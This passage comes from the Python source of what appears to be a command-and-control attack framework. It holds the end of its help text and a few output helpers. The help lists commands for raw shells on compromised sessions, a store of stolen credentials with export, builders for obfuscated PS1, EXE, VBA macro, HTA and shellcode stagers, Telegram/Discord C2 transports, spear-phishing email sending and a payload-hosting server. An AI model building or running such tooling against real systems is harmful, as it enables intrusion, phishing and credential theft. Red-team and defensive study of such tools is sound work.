  SHELL
  ────────────────────────────────────────────────────────────
  shell <command>             Run a raw shell command on active session

  LOOT
  ────────────────────────────────────────────────────────────
  loot                             List recent loot entries
  loot -q <keyword>                Search label and tags
  loot -t <kind>                   Filter by kind (credential/file/screenshot/…)
  loot -a <agent_id>               Filter by agent
  loot -d <id>                     Dump raw data for a loot entry
  loot -x <id>                     Delete a loot entry
  loot --export text               Print as formatted table
  loot --export csv                Print as CSV
  loot --export bh                 Print as BloodHound JSON (credentials only)
  loot --export csv --out out.csv  Write export to file

  BUILDER
  ────────────────────────────────────────────────────────────
  builder -f ps1 -a <id>               Build PS1 stager
  builder -f exe -a <id> --arch x64    Build EXE (requires mingw-w64)
  builder -f vba -a <id>               Build VBA macro stager
  builder -f hta -a <id>               Build HTA stager
  builder -f shellcode -a <id>         Build raw shellcode (requires donut)
  builder --list                       List builds in output directory
  Options: --arch x64|x86  --sleep N  --jitter N  --encrypt none|xor|aes-256-gcm  --out name

  SCHEDULER
  ────────────────────────────────────────────────────────────
  schedules                   List all active recurring schedules
  schedule <plugin> <secs> [id]  Add recurring plugin execution
  unschedule <schedule_id>    Remove a recurring schedule

  PROFILE
  ────────────────────────────────────────────────────────────
  profile list                List available malleable C2 profiles
  profile set <name>          Hot-swap active C2 profile (no restart)
  profile info [name]         Show profile details

  HISTORY & AUDIT
  ────────────────────────────────────────────────────────────
  history [agent_id]          Show touch log for agent
  audit [n]                   Show last N audit log entries
  audit-verify                Verify HMAC integrity of entire audit log

  INFRASTRUCTURE
  ────────────────────────────────────────────────────────────
  listeners                   Show transport status
  listeners failover          Force switch to Discord
  listeners recover           Force switch back to Telegram
  status                      Show server status
  project info                Show current project details
  project list                List all projects

  INITIAL ACCESS  (offline — no active session required)
  ────────────────────────────────────────────────────────────
  use phish_link              Generate HTML/URL/.url lure artifacts
  use macro_drop              Generate obfuscated VBA / HTA stager
  use phish_email             Send spear-phishing emails via SMTP
    set smtp_host <host>
    set from_addr <addr>
    set to <victim@target.com>
    set payload_url <http://your-ip:8080/d/<token>>
    set attachment <path/to/doc>
    run
  use delivery_server         Start payload-hosting HTTP server
    set action start          Start server (default port 8080)
    set action add_payload    Register a file for delivery
    set payload <path>        File to serve
    set one_time true         Burn token after first download
    set action log            Show access / download events
    set action stop           Stop the server
    run

  GENERAL
  ────────────────────────────────────────────────────────────
  help                        Show this help text
  exit / quit                 Exit the framework
"""


# ── Output helpers ────────────────────────────────────────────────────────────

def _ok(msg: str)   -> None: print(f"\033[32m  [+]\033[0m {msg}")
def _err(msg: str)  -> None: print(f"\033[31m  [-]\033[0m {msg}")
def _info(msg: str) -> None: print(f"\033[90m  [*]\033[0m {msg}")


def _print_data(data) -> None:
    if isinstance(data, dict):
        for k, v in data.items():
            print(f"  {k:<20} : {v}")
    elif isinstance(data, list):
        for item in data:
            print(f"  {item}")
    else:
        print(f"  {data}")
